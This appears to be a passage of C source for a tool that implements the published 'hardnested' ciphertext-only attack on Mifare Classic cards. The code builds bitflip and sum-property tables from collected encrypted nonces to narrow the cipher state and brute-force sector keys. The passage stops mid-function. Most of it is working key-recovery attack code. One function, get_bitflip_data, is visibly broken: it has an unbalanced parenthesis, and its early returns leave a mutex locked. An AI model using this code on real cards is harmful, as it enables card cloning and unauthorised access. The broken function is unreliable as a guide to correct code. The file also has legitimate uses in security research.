//-----------------------------------------------------------------------------
// Copyright (C) 2015, 2016 by piwi
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// Implements a card only attack based on crypto text (encrypted nonces
// received during a nested authentication) only. Unlike other card only
// attacks this doesn't rely on implementation errors but only on the
// inherent weaknesses of the crypto1 cypher. Described in
//   Carlo Meijer, Roel Verdult, "Ciphertext-only Cryptanalysis on Hardened
//   Mifare Classic Cards" in Proceedings of the 22nd ACM SIGSAC Conference on 
//   Computer and Communications Security, 2015
//-----------------------------------------------------------------------------

#include "hardnested.h"

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <locale.h>
#include <math.h>
#include "nfc.h"
#ifdef _MSC_VER
#include <direct.h>
#include <windows.h>
#else
#include <unistd.h>
#endif
#include "util.h"
#include "util_posix.h"
#include "crapto1.h"
#include "parity.h"
#include "hardnested/hardnested_bruteforce.h"
#include "hardnested/hardnested_bitarray_core.h"
#include "hardnested/tables.h"
#include "mifare.h"
#include "nfc-utils.h"
#include "main.h" // Accessing t

#define IGNORE_BITFLIP_THRESHOLD  0.99 // ignore bitflip arrays which have nearly only valid states
#define MC_AUTH_A 0x60
#define MC_AUTH_B 0x61
#define NUM_PART_SUMS                   9 // number of possible partial sum property values
#define QUEUE_LEN 4
#define NUM_REFINES 1
#define BITFLIP_2ND_BYTE 0x0200
#define CHECK_1ST_BYTES 0x01
#define CHECK_2ND_BYTES 0x02

static uint16_t sums[NUM_SUMS] = {0, 32, 56, 64, 80, 96, 104, 112, 120, 128, 136, 144, 152, 160, 176, 192, 200, 224, 256}; // possible sum property values

static uint32_t num_acquired_nonces = 0;
static uint64_t start_time = 0;
static uint16_t effective_bitflip[2][0x400];
static uint16_t num_effective_bitflips[2] = {0, 0};
static uint16_t all_effective_bitflip[0x400];
static uint16_t num_all_effective_bitflips = 0;
static uint16_t num_1st_byte_effective_bitflips = 0;
static uint8_t hardnested_stage = CHECK_1ST_BYTES;
static uint64_t known_target_key;
static uint32_t test_state[2] = {0, 0};
static float brute_force_per_second;
static pthread_mutex_t statelist_cache_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t book_of_work_mutex = PTHREAD_MUTEX_INITIALIZER;
static uint16_t real_sum_a8 = 0;
static uint32_t part_sum_count[2][NUM_PART_SUMS][NUM_PART_SUMS];
static float my_p_K[NUM_SUMS];
static const float* p_K;
static uint32_t cuid;
static noncelist_t nonces[256];
static uint8_t best_first_bytes[256];
static uint64_t maximum_states = 0;
static uint8_t best_first_byte_smallest_bitarray = 0;
static uint16_t first_byte_Sum = 0;
static uint16_t first_byte_num = 0;
static bool write_stats = false;
static uint32_t* all_bitflips_bitarray[2];
static uint32_t num_all_bitflips_bitarray[2];
static bool all_bitflips_bitarray_dirty[2];
static uint64_t last_sample_clock = 0;
static uint64_t sample_period = 0;
static uint64_t num_keys_tested = 0;
static statelist_t* candidates = NULL;
static char failstr[250] = "";
static work_status_t book_of_work[NUM_PART_SUMS][NUM_PART_SUMS][NUM_PART_SUMS][NUM_PART_SUMS];

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// sum property bitarrays

static uint32_t* part_sum_a0_bitarrays[2][NUM_PART_SUMS];
static uint32_t* part_sum_a8_bitarrays[2][NUM_PART_SUMS];
static uint32_t* sum_a0_bitarrays[2][NUM_SUMS];

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// bitflip property bitarrays

static uint32_t* bitflip_bitarrays[2][0x400];
static uint32_t count_bitflip_bitarrays[2][0x400];

// Status of target
static uint8_t targetBLOCK;
static uint8_t targetKEY;


static bool hard_LOW_MEM;
static bool bitflips_available[2][0x400];
static bool bitflips_allocated[2][0x400];
static pthread_mutex_t bitflip_mutex = PTHREAD_MUTEX_INITIALIZER;


void remove_bitflip_data(odd_even_t odd_even, uint16_t bitflip){
    pthread_mutex_lock(&bitflip_mutex);
    if (hard_LOW_MEM && bitflips_allocated[odd_even][bitflip]) {
        FREE_BITARRAY(bitflip_bitarrays[odd_even][bitflip]);
        bitflips_allocated[odd_even][bitflip] = false;
    }
    pthread_mutex_unlock(&bitflip_mutex);
}

uint32_t* get_bitflip_data(odd_even_t odd_even, uint16_t bitflip) {
    if (!bitflips_available[odd_even][bitflip]) {
        return NULL;
    }

    pthread_mutex_lock(&bitflip_mutex);
    if (hard_LOW_MEM && !bitflips_allocated[odd_even][bitflip]) {
        lzma_stream strm = LZMA_STREAM_INIT;
        bitflip_info p = get_bitflip(odd_even, bitflip);

        uint32_t count = 0;

        if (!lzma_init_inflate(&strm, p.input_buffer, p.len, (uint8_t*) & count, sizeof (count)))
            return NULL;
        if ((float) count / (1 << 24) < IGNORE_BITFLIP_THRESHOLD) {
            uint32_t *bitset = (uint32_t *) MALLOC_BITARRAY(sizeof (uint32_t) * (1 << 19));
            if (bitset == NULL) {
                printf("Out of memory error in init_bitflip_statelists(). Aborting...\n");
                lzma_end(&strm);
                exit(4);
            }

            strm.next_out = (uint8_t *) bitset;
            strm.avail_out = sizeof (uint32_t) * (1 << 19);
            if (!decompress(&strm)
                return NULL;

            bitflip_bitarrays[odd_even][bitflip] = bitset;
            bitflips_allocated[odd_even][bitflip] = true;
        }
        lzma_end(&strm);
    }
    pthread_mutex_unlock(&bitflip_mutex);
    
    return bitflip_bitarrays[odd_even][bitflip];


}


// Sectors 0 to 31 have 4 blocks per sector.
// Sectors 32 to 39 have 16 blocks per sector.

uint8_t block_to_sector(uint8_t block) {
    if (block < 128) {
        return block >> 2;
    }
    block -= 128;
    return 32 + (block >> 4);
}


static void print_progress_header(void) {
    printf("Start using %d threads\n", num_CPUs());
    
    static uint8_t keyType;
    if (targetKEY == MC_AUTH_A) {
        keyType = 'A';
    } else if (targetKEY == MC_AUTH_B) {
        keyType = 'B';
    } else {
        keyType = '?';
    }
    
    printf("\n\n");
    printf("Target | #Nonces | Activity                                                | Remaining brute force states\n");
    printf("----------------------------------------------------------------------------------------------------------\n");
    printf(" %2d%c   |       0 | Init                                                    |\n", block_to_sector(targetBLOCK), keyType);
}


void hardnested_print_progress(uint32_t nonces, char *activity, float brute_force, uint64_t min_diff_print_time, uint8_t trgKeyBlock, uint8_t trgKeyType, bool newline) {
    static uint64_t last_print_time = 0;
    static uint8_t keyType;
    if (msclock() - last_print_time > min_diff_print_time) {
        last_print_time = msclock();
        if (trgKeyType == MC_AUTH_A) {
            keyType = 'A';
        } else if (trgKeyType == MC_AUTH_B) {
            keyType = 'B';
        } else {
            keyType = '?';
        }

        printf(" %2d%c   | %7d | %-55s | %15.0f\n", block_to_sector(trgKeyBlock), keyType, nonces, activity, brute_force);
    }
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// bitarray functions

static inline void clear_bitarray24(uint32_t *bitarray) {
    memset(bitarray, 0x00, sizeof(uint32_t) * (1 << 19));
}


static inline void set_bitarray24(uint32_t *bitarray) {
    memset(bitarray, 0xff, sizeof(uint32_t) * (1 << 19));
}


static inline void set_bit24(uint32_t *bitarray, uint32_t index) {
    bitarray[index >> 5] |= 0x80000000 >> (index & 0x0000001f);
}

static inline uint32_t test_bit24(uint32_t *bitarray, uint32_t index) {
    return bitarray[index >> 5] & (0x80000000 >> (index & 0x0000001f));
}


static inline uint32_t next_state(uint32_t *bitarray, uint32_t state) {
    if (++state == 1 << 24) return 1 << 24;
    uint32_t index = state >> 5;
    uint_fast8_t bit = state & 0x1f;
    uint32_t line = bitarray[index] << bit;
    while (bit <= 0x1f) {
        if (line & 0x80000000) return state;
        state++;
        bit++;
        line <<= 1;
    }
    index++;
    while (bitarray[index] == 0x00000000 && state < 1 << 24) {
        index++;
        state += 0x20;
    }
    if (state >= 1 << 24) return 1 << 24;
    return state + __builtin_clz(bitarray[index]);
}


static int compare_count_bitflip_bitarrays(const void *b1, const void *b2) {
    uint64_t count1 = (uint64_t)count_bitflip_bitarrays[ODD_STATE][*(uint16_t *)b1] * count_bitflip_bitarrays[EVEN_STATE][*(uint16_t *)b1];
    uint64_t count2 = (uint64_t)count_bitflip_bitarrays[ODD_STATE][*(uint16_t *)b2] * count_bitflip_bitarrays[EVEN_STATE][*(uint16_t *)b2];
    return (count1 > count2) - (count2 > count1);
}


static bool init_bitflip_bitarrays(void) {

    //	z_stream compressed_stream;
    lzma_stream strm = LZMA_STREAM_INIT;

    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        num_effective_bitflips[odd_even] = 0;
        for (uint16_t bitflip = 0x001; bitflip < 0x400; bitflip++) {
            bitflip_bitarrays[odd_even][bitflip] = NULL;
            bitflips_available[odd_even][bitflip] = false;
            bitflips_allocated[odd_even][bitflip] = false;
            count_bitflip_bitarrays[odd_even][bitflip] = 1 << 24;
            bitflip_info p = get_bitflip(odd_even, bitflip);
            if (p.input_buffer != NULL) {
                uint32_t count = 0;
                bitflips_available[odd_even][bitflip] = true;

                if (!lzma_init_inflate(&strm, p.input_buffer, p.len, (uint8_t*)&count, sizeof(count)))
                    return false;
                if ((float)count / (1 << 24) < IGNORE_BITFLIP_THRESHOLD) {
                    uint32_t *bitset = (uint32_t *)MALLOC_BITARRAY(sizeof(uint32_t) * (1 << 19));
                    if (bitset == NULL) {
                      printf("Out of memory error in init_bitflip_statelists(). Aborting...\n");
                      lzma_end(&strm);
                      exit(4);
                    }

                    strm.next_out = (uint8_t *)bitset;
                    strm.avail_out = sizeof(uint32_t) * (1 << 19);
                    if (!decompress(&strm))
                        return false;

                  effective_bitflip[odd_even][num_effective_bitflips[odd_even]++] = bitflip;
                  if (hard_LOW_MEM) {
                    FREE_BITARRAY(bitset);
                  } else {
                    bitflip_bitarrays[odd_even][bitflip] = bitset;  
                  }
                  count_bitflip_bitarrays[odd_even][bitflip] = count;
                }
				lzma_end(&strm);
            }
        }
        effective_bitflip[odd_even][num_effective_bitflips[odd_even]] = 0x400; // EndOfList marker
    }
    uint16_t i = 0;
    uint16_t j = 0;
    num_all_effective_bitflips = 0;
    num_1st_byte_effective_bitflips = 0;
    while (i < num_effective_bitflips[EVEN_STATE] || j < num_effective_bitflips[ODD_STATE]) {
        if (effective_bitflip[EVEN_STATE][i] < effective_bitflip[ODD_STATE][j]) {
            all_effective_bitflip[num_all_effective_bitflips++] = effective_bitflip[EVEN_STATE][i];
            i++;
        } else if (effective_bitflip[EVEN_STATE][i] > effective_bitflip[ODD_STATE][j]) {
            all_effective_bitflip[num_all_effective_bitflips++] = effective_bitflip[ODD_STATE][j];
            j++;
        } else {
            all_effective_bitflip[num_all_effective_bitflips++] = effective_bitflip[EVEN_STATE][i];
            i++;
            j++;
        }
        if (!(all_effective_bitflip[num_all_effective_bitflips - 1] & BITFLIP_2ND_BYTE)) {
            num_1st_byte_effective_bitflips = num_all_effective_bitflips;
        }
    }
    qsort(all_effective_bitflip, num_1st_byte_effective_bitflips, sizeof(uint16_t), compare_count_bitflip_bitarrays);
    qsort(all_effective_bitflip + num_1st_byte_effective_bitflips, num_all_effective_bitflips - num_1st_byte_effective_bitflips, sizeof(uint16_t), compare_count_bitflip_bitarrays);
    char progress_text[80];
    sprintf(progress_text, "Using %d precalculated bitflip state tables", num_all_effective_bitflips);
    hardnested_print_progress(0, progress_text, (float) (1LL << 47), 0, targetBLOCK, targetKEY, true);
    return true;
}


static void free_bitflip_bitarrays(void) {
    for (int16_t bitflip = 0x3ff; bitflip > 0x000; bitflip--) {
        if (hard_LOW_MEM && !bitflips_allocated[ODD_STATE][bitflip]) {
            continue;
        }
        FREE_BITARRAY(bitflip_bitarrays[ODD_STATE][bitflip]);
    }
    for (int16_t bitflip = 0x3ff; bitflip > 0x000; bitflip--) {
        if (hard_LOW_MEM && !bitflips_allocated[EVEN_STATE][bitflip]) {
            continue;
        }
        FREE_BITARRAY(bitflip_bitarrays[EVEN_STATE][bitflip]);
    }
}


static uint16_t PartialSumProperty(uint32_t state, odd_even_t odd_even) {
    uint16_t sum = 0;
    for (uint16_t j = 0; j < 16; j++) {
        uint32_t st = state;
        uint16_t part_sum = 0;
        if (odd_even == ODD_STATE) {
            part_sum ^= filter(st);
            for (uint16_t i = 0; i < 4; i++) {
                st = (st << 1) | ((j >> (3 - i)) & 0x01) ;
                part_sum ^= filter(st);
            }
            part_sum ^= 1; // XOR 1 cancelled out for the other 8 bits
        } else {
            for (uint16_t i = 0; i < 4; i++) {
                st = (st << 1) | ((j >> (3 - i)) & 0x01) ;
                part_sum ^= filter(st);
            }
        }
        sum += part_sum;
    }
    return sum;
}


static void init_part_sum_bitarrays(void) {
    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        for (uint16_t part_sum_a0 = 0; part_sum_a0 < NUM_PART_SUMS; part_sum_a0++) {
            part_sum_a0_bitarrays[odd_even][part_sum_a0] = (uint32_t *)MALLOC_BITARRAY(sizeof(uint32_t) * (1 << 19));
            if (part_sum_a0_bitarrays[odd_even][part_sum_a0] == NULL) {
                printf("Out of memory error in init_part_suma0_statelists(). Aborting...\n");
                exit(4);
            }
            clear_bitarray24(part_sum_a0_bitarrays[odd_even][part_sum_a0]);
        }
    }
    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        for (uint32_t state = 0; state < (1 << 20); state++) {
            uint16_t part_sum_a0 = PartialSumProperty(state, odd_even) / 2;
            for (uint16_t low_bits = 0; low_bits < 1 << 4; low_bits++) {
                set_bit24(part_sum_a0_bitarrays[odd_even][part_sum_a0], state << 4 | low_bits);
            }
        }
    }

    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        for (uint16_t part_sum_a8 = 0; part_sum_a8 < NUM_PART_SUMS; part_sum_a8++) {
            part_sum_a8_bitarrays[odd_even][part_sum_a8] = (uint32_t *)MALLOC_BITARRAY(sizeof(uint32_t) * (1 << 19));
            if (part_sum_a8_bitarrays[odd_even][part_sum_a8] == NULL) {
                printf("Out of memory error in init_part_suma8_statelists(). Aborting...\n");
                exit(4);
            }
            clear_bitarray24(part_sum_a8_bitarrays[odd_even][part_sum_a8]);
        }
    }
    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        for (uint32_t state = 0; state < (1 << 20); state++) {
            uint16_t part_sum_a8 = PartialSumProperty(state, odd_even) / 2;
            for (uint16_t high_bits = 0; high_bits < 1 << 4; high_bits++) {
                set_bit24(part_sum_a8_bitarrays[odd_even][part_sum_a8], state | high_bits << 20);
            }
        }
    }
}


static void free_part_sum_bitarrays(void) {
    for (int16_t part_sum_a8 = (NUM_PART_SUMS - 1); part_sum_a8 >= 0; part_sum_a8--) {
        FREE_BITARRAY(part_sum_a8_bitarrays[ODD_STATE][part_sum_a8]);
    }
    for (int16_t part_sum_a8 = (NUM_PART_SUMS - 1); part_sum_a8 >= 0; part_sum_a8--) {
        FREE_BITARRAY(part_sum_a8_bitarrays[EVEN_STATE][part_sum_a8]);
    }
    for (int16_t part_sum_a0 = (NUM_PART_SUMS - 1); part_sum_a0 >= 0; part_sum_a0--) {
        FREE_BITARRAY(part_sum_a0_bitarrays[ODD_STATE][part_sum_a0]);
    }
    for (int16_t part_sum_a0 = (NUM_PART_SUMS - 1); part_sum_a0 >= 0; part_sum_a0--) {
        FREE_BITARRAY(part_sum_a0_bitarrays[EVEN_STATE][part_sum_a0]);
    }
}


static void init_sum_bitarrays(void) {
    for (uint16_t sum_a0 = 0; sum_a0 < NUM_SUMS; sum_a0++) {
        for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
            sum_a0_bitarrays[odd_even][sum_a0] = (uint32_t *)MALLOC_BITARRAY(sizeof(uint32_t) * (1 << 19));
            if (sum_a0_bitarrays[odd_even][sum_a0] == NULL) {
                printf("Out of memory error in init_sum_bitarrays(). Aborting...\n");
                exit(4);
            }
            clear_bitarray24(sum_a0_bitarrays[odd_even][sum_a0]);
        }
    }
    for (uint8_t p = 0; p < NUM_PART_SUMS; p++) {
        for (uint8_t q = 0; q < NUM_PART_SUMS; q++) {
            uint16_t sum_a0 = 2 * p * (16 - 2 * q) + (16 - 2 * p) * 2 * q;
            uint16_t sum_a0_idx = 0;
            while (sums[sum_a0_idx] != sum_a0) sum_a0_idx++;
            BITARRAY_OR(sum_a0_bitarrays[EVEN_STATE][sum_a0_idx], part_sum_a0_bitarrays[EVEN_STATE][q]);
            BITARRAY_OR(sum_a0_bitarrays[ODD_STATE][sum_a0_idx], part_sum_a0_bitarrays[ODD_STATE][p]);
        }
    }

}


static void free_sum_bitarrays(void) {
    for (int8_t sum_a0 = NUM_SUMS - 1; sum_a0 >= 0; sum_a0--) {
        FREE_BITARRAY(sum_a0_bitarrays[ODD_STATE][sum_a0]);
        FREE_BITARRAY(sum_a0_bitarrays[EVEN_STATE][sum_a0]);
    }
}


static int add_nonce(uint32_t nonce_enc, uint8_t par_enc) {
    uint8_t first_byte = nonce_enc >> 24;
    noncelistentry_t *p1 = nonces[first_byte].first;
    noncelistentry_t *p2 = NULL;

    if (p1 == NULL) { // first nonce with this 1st byte
        first_byte_num++;
        first_byte_Sum += evenparity32((nonce_enc & 0xff000000) | (par_enc & 0x08));
    }

    while (p1 != NULL && (p1->nonce_enc & 0x00ff0000) < (nonce_enc & 0x00ff0000)) {
        p2 = p1;
        p1 = p1->next;
    }

    if (p1 == NULL) {                                                          // need to add at the end of the list
        if (p2 == NULL) {           // list is empty yet. Add first entry.
            p2 = nonces[first_byte].first = malloc(sizeof(noncelistentry_t));
        } else {                    // add new entry at end of existing list.
            p2 = p2->next = malloc(sizeof(noncelistentry_t));
        }
    } else if ((p1->nonce_enc & 0x00ff0000) != (nonce_enc & 0x00ff0000)) {     // found distinct 2nd byte. Need to insert.
        if (p2 == NULL) {           // need to insert at start of list
            p2 = nonces[first_byte].first = malloc(sizeof(noncelistentry_t));
        } else {
            p2 = p2->next = malloc(sizeof(noncelistentry_t));
        }
    } else {                                                                   // we have seen this 2nd byte before. Nothing to add or insert.
        return (0);
    }

    // add or insert new data
    p2->next = p1;
    p2->nonce_enc = nonce_enc;
    p2->par_enc = par_enc;

    nonces[first_byte].num++;
    nonces[first_byte].Sum += evenparity32((nonce_enc & 0x00ff0000) | (par_enc & 0x04));
    nonces[first_byte].sum_a8_guess_dirty = true;   // indicates that we need to recalculate the Sum(a8) probability for this first byte
    return (1); // new nonce added
}


static void init_nonce_memory(void) {
    for (uint16_t i = 0; i < 256; i++) {
        nonces[i].num = 0;
        nonces[i].Sum = 0;
        nonces[i].first = NULL;
        for (uint16_t j = 0; j < NUM_SUMS; j++) {
            nonces[i].sum_a8_guess[j].sum_a8_idx = j;
            nonces[i].sum_a8_guess[j].prob = 0.0;
        }
        nonces[i].sum_a8_guess_dirty = false;
        for (uint16_t bitflip = 0x000; bitflip < 0x400; bitflip++) {
            nonces[i].BitFlips[bitflip] = 0;
        }
        nonces[i].states_bitarray[EVEN_STATE] = (uint32_t *)MALLOC_BITARRAY(sizeof(uint32_t) * (1 << 19));
        if (nonces[i].states_bitarray[EVEN_STATE] == NULL) {
            printf("Out of memory error in init_nonce_memory(). Aborting...\n");
            exit(4);
        }
        set_bitarray24(nonces[i].states_bitarray[EVEN_STATE]);
        nonces[i].num_states_bitarray[EVEN_STATE] = 1 << 24;
        nonces[i].states_bitarray[ODD_STATE] = (uint32_t *)MALLOC_BITARRAY(sizeof(uint32_t) * (1 << 19));
        if (nonces[i].states_bitarray[ODD_STATE] == NULL) {
            printf("Out of memory error in init_nonce_memory(). Aborting...\n");
            exit(4);
        }
        set_bitarray24(nonces[i].states_bitarray[ODD_STATE]);
        nonces[i].num_states_bitarray[ODD_STATE] = 1 << 24;
        nonces[i].all_bitflips_dirty[EVEN_STATE] = false;
        nonces[i].all_bitflips_dirty[ODD_STATE] = false;
    }
    first_byte_num = 0;
    first_byte_Sum = 0;
}


static void free_nonce_list(noncelistentry_t *p) {
    if (p == NULL) {
        return;
    } else {
        free_nonce_list(p->next);
        free(p);
    }
}


static void free_nonces_memory(void) {
    for (uint16_t i = 0; i < 256; i++) {
        free_nonce_list(nonces[i].first);
    }
    for (int i = 255; i >= 0; i--) {
        FREE_BITARRAY(nonces[i].states_bitarray[ODD_STATE]);
        FREE_BITARRAY(nonces[i].states_bitarray[EVEN_STATE]);
    }
}


static double p_hypergeometric(uint16_t i_K, uint16_t n, uint16_t k) {
    uint16_t const N = 256;
    uint16_t K = sums[i_K];

    if (n - k > N - K || k > K) return 0.0; // avoids log(x<=0) in calculation below
    if (k == 0) {
        // use logarithms to avoid overflow with huge factorials (double type can only hold 170!)
        double log_result = 0.0;
        for (int16_t i = N - K; i >= N - K - n + 1; i--) {
            log_result += log(i);
        }
        for (int16_t i = N; i >= N - n + 1; i--) {
            log_result -= log(i);
        }
        // p_hypergeometric_cache[n][i_K][k] = exp(log_result);
        return exp(log_result);
    } else {
        if (n - k == N - K) { // special case. The published recursion below would fail with a divide by zero exception
            double log_result = 0.0;
            for (int16_t i = k + 1; i <= n; i++) {
                log_result += log(i);
            }
            for (int16_t i = K + 1; i <= N; i++) {
                log_result -= log(i);
            }
            // p_hypergeometric_cache[n][i_K][k] = exp(log_result);
            return exp(log_result);
        } else {          // recursion
            return (p_hypergeometric(i_K, n, k - 1) * (K - k + 1) * (n - k + 1) / (k * (N - K - n + k)));
        }
    }
}


static float sum_probability(uint16_t i_K, uint16_t n, uint16_t k) {
    if (k > sums[i_K]) return 0.0;

    double p_T_is_k_when_S_is_K = p_hypergeometric(i_K, n, k);
    double p_S_is_K = p_K[i_K];
    double p_T_is_k = 0;
    for (uint16_t i = 0; i < NUM_SUMS; i++) {
        p_T_is_k += p_K[i] * p_hypergeometric(i, n, k);
    }
    return (p_T_is_k_when_S_is_K * p_S_is_K / p_T_is_k);
}


static void init_allbitflips_array(void) {
    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        uint32_t *bitset = all_bitflips_bitarray[odd_even] = (uint32_t *)MALLOC_BITARRAY(sizeof(uint32_t) * (1 << 19));
        if (bitset == NULL) {
            printf("Out of memory in init_allbitflips_array(). Aborting...");
            exit(4);
        }
        set_bitarray24(bitset);
        all_bitflips_bitarray_dirty[odd_even] = false;
        num_all_bitflips_bitarray[odd_even] = 1 << 24;
    }
}


static void update_allbitflips_array(void) {
    if (hardnested_stage & CHECK_2ND_BYTES) {
        for (uint16_t i = 0; i < 256; i++) {
            for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
                if (nonces[i].all_bitflips_dirty[odd_even]) {
                    uint32_t old_count = num_all_bitflips_bitarray[odd_even];
                    num_all_bitflips_bitarray[odd_even] = COUNT_BITARRAY_LOW20_AND(all_bitflips_bitarray[odd_even], nonces[i].states_bitarray[odd_even]);
                    nonces[i].all_bitflips_dirty[odd_even] = false;
                    if (num_all_bitflips_bitarray[odd_even] != old_count) {
                        all_bitflips_bitarray_dirty[odd_even] = true;
                    }
                }
            }
        }
    }
}


static uint32_t estimated_num_states_part_sum_coarse(uint16_t part_sum_a0_idx, uint16_t part_sum_a8_idx, odd_even_t odd_even) {
    return part_sum_count[odd_even][part_sum_a0_idx][part_sum_a8_idx];
}


static uint32_t estimated_num_states_part_sum(uint8_t first_byte, uint16_t part_sum_a0_idx, uint16_t part_sum_a8_idx, odd_even_t odd_even) {
    if (odd_even == ODD_STATE) {
        return COUNT_BITARRAY_AND3(part_sum_a0_bitarrays[odd_even][part_sum_a0_idx],
                                   part_sum_a8_bitarrays[odd_even][part_sum_a8_idx],
                                   nonces[first_byte].states_bitarray[odd_even]);
    } else {
        return COUNT_BITARRAY_AND4(part_sum_a0_bitarrays[odd_even][part_sum_a0_idx],
                                   part_sum_a8_bitarrays[odd_even][part_sum_a8_idx],
                                   nonces[first_byte].states_bitarray[odd_even],
                                   nonces[first_byte ^ 0x80].states_bitarray[odd_even]);
    }

}


static uint64_t estimated_num_states(uint8_t first_byte, uint16_t sum_a0, uint16_t sum_a8) {
    uint64_t num_states = 0;
    for (uint8_t p = 0; p < NUM_PART_SUMS; p++) {
        for (uint8_t q = 0; q < NUM_PART_SUMS; q++) {
            if (2 * p * (16 - 2 * q) + (16 - 2 * p) * 2 * q == sum_a0) {
                for (uint8_t r = 0; r < NUM_PART_SUMS; r++) {
                    for (uint8_t s = 0; s < NUM_PART_SUMS; s++) {
                        if (2 * r * (16 - 2 * s) + (16 - 2 * r) * 2 * s == sum_a8) {
                            num_states += (uint64_t)estimated_num_states_part_sum(first_byte, p, r, ODD_STATE)
                                          * estimated_num_states_part_sum(first_byte, q, s, EVEN_STATE);
                        }
                    }
                }
            }
        }
    }
    return num_states;
}


static uint64_t estimated_num_states_coarse(uint16_t sum_a0, uint16_t sum_a8) {
    uint64_t num_states = 0;
    for (uint8_t p = 0; p < NUM_PART_SUMS; p++) {
        for (uint8_t q = 0; q < NUM_PART_SUMS; q++) {
            if (2 * p * (16 - 2 * q) + (16 - 2 * p) * 2 * q == sum_a0) {
                for (uint8_t r = 0; r < NUM_PART_SUMS; r++) {
                    for (uint8_t s = 0; s < NUM_PART_SUMS; s++) {
                        if (2 * r * (16 - 2 * s) + (16 - 2 * r) * 2 * s == sum_a8) {
                            num_states += (uint64_t)estimated_num_states_part_sum_coarse(p, r, ODD_STATE)
                                          * estimated_num_states_part_sum_coarse(q, s, EVEN_STATE);
                        }
                    }
                }
            }
        }
    }
    return num_states;
}


static void update_p_K(void) {
    if (hardnested_stage & CHECK_2ND_BYTES) {
        uint64_t total_count = 0;
        uint16_t sum_a0 = sums[first_byte_Sum];
        for (uint8_t sum_a8_idx = 0; sum_a8_idx < NUM_SUMS; sum_a8_idx++) {
            uint16_t sum_a8 = sums[sum_a8_idx];
            total_count += estimated_num_states_coarse(sum_a0, sum_a8);
        }
        for (uint8_t sum_a8_idx = 0; sum_a8_idx < NUM_SUMS; sum_a8_idx++) {
            uint16_t sum_a8 = sums[sum_a8_idx];
            my_p_K[sum_a8_idx] = (float) estimated_num_states_coarse(sum_a0, sum_a8) / total_count;
        }
        p_K = my_p_K;
    }
}


static void update_sum_bitarrays(odd_even_t odd_even) {
    if (all_bitflips_bitarray_dirty[odd_even]) {
        for (uint8_t part_sum = 0; part_sum < NUM_PART_SUMS; part_sum++) {
            BITARRAY_AND(part_sum_a0_bitarrays[odd_even][part_sum], all_bitflips_bitarray[odd_even]);
            BITARRAY_AND(part_sum_a8_bitarrays[odd_even][part_sum], all_bitflips_bitarray[odd_even]);
        }
        for (uint16_t i = 0; i < 256; i++) {
            nonces[i].num_states_bitarray[odd_even] = COUNT_BITARRAY_AND(nonces[i].states_bitarray[odd_even], all_bitflips_bitarray[odd_even]);
        }
        for (uint8_t part_sum_a0 = 0; part_sum_a0 < NUM_PART_SUMS; part_sum_a0++) {
            for (uint8_t part_sum_a8 = 0; part_sum_a8 < NUM_PART_SUMS; part_sum_a8++) {
                part_sum_count[odd_even][part_sum_a0][part_sum_a8]
                += COUNT_BITARRAY_AND2(part_sum_a0_bitarrays[odd_even][part_sum_a0], part_sum_a8_bitarrays[odd_even][part_sum_a8]);
            }
        }
        all_bitflips_bitarray_dirty[odd_even] = false;
    }
}


static int compare_expected_num_brute_force(const void *b1, const void *b2) {
    uint8_t index1 = *(uint8_t *)b1;
    uint8_t index2 = *(uint8_t *)b2;
    float score1 = nonces[index1].expected_num_brute_force;
    float score2 = nonces[index2].expected_num_brute_force;
    return (score1 > score2) - (score1 < score2);
}


static int compare_sum_a8_guess(const void *b1, const void *b2) {
    float prob1 = ((guess_sum_a8_t *)b1)->prob;
    float prob2 = ((guess_sum_a8_t *)b2)->prob;
    return (prob1 < prob2) - (prob1 > prob2);
}


static float check_smallest_bitflip_bitarrays(void) {
    uint64_t smallest = 1LL << 48;
    // initialize best_first_bytes, do a rough estimation on remaining states
    for (uint16_t i = 0; i < 256; i++) {
        uint32_t num_odd = nonces[i].num_states_bitarray[ODD_STATE];
        uint32_t num_even = nonces[i].num_states_bitarray[EVEN_STATE]; // * (float)nonces[i^0x80].num_states_bitarray[EVEN_STATE] / num_all_bitflips_bitarray[EVEN_STATE];
        if ((uint64_t)num_odd * num_even < smallest) {
            smallest = (uint64_t)num_odd * num_even;
            best_first_byte_smallest_bitarray = i;
        }
    }
    return (float)smallest / 2.0;
}


static void update_expected_brute_force(uint8_t best_byte) {
    float total_prob = 0.0;
    for (uint8_t i = 0; i < NUM_SUMS; i++) {
        total_prob += nonces[best_byte].sum_a8_guess[i].prob;
    }
    // linear adjust probabilities to result in total_prob = 1.0;
    for (uint8_t i = 0; i < NUM_SUMS; i++) {
        nonces[best_byte].sum_a8_guess[i].prob /= total_prob;
    }
    float prob_all_failed = 1.0;
    nonces[best_byte].expected_num_brute_force = 0.0;
    for (uint8_t i = 0; i < NUM_SUMS; i++) {
        nonces[best_byte].expected_num_brute_force += nonces[best_byte].sum_a8_guess[i].prob * (float)nonces[best_byte].sum_a8_guess[i].num_states / 2.0;
        prob_all_failed -= nonces[best_byte].sum_a8_guess[i].prob;
        nonces[best_byte].expected_num_brute_force += prob_all_failed * (float)nonces[best_byte].sum_a8_guess[i].num_states / 2.0;
    }
    return;
}


static float sort_best_first_bytes(void) {
    // initialize best_first_bytes, do a rough estimation on remaining states for each Sum_a8 property
    // and the expected number of states to brute force
    for (uint16_t i = 0; i < 256; i++) {
        best_first_bytes[i] = i;
        float prob_all_failed = 1.0;
        nonces[i].expected_num_brute_force = 0.0;
        for (uint8_t j = 0; j < NUM_SUMS; j++) {
